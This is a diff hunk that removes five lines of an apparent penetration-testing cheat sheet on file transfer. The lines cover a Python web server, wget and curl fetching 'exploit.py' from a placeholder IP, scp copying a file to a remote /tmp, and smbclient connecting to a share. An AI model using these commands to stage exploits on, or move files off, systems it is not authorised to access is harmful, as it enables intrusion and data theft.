@@ -1,5 +1,0 @@
-python3 -m http.server 80       # Python Web Server: Instantly hosts files in the current directory on port 80.
-wget http://<IP>/exploit.py     # Wget: Downloads a file from a remote server to the local machine.
-curl -O http://<IP>/exploit.py  # cURL: Downloads a file while keeping its original name.
-scp file.txt user@<IP>:/tmp/    # Secure Copy: Transfers a file over an encrypted SSH connection.
-smbclient //192.168.1.10/share  # SMB Client: Connects to a Windows/Samba shared folder.
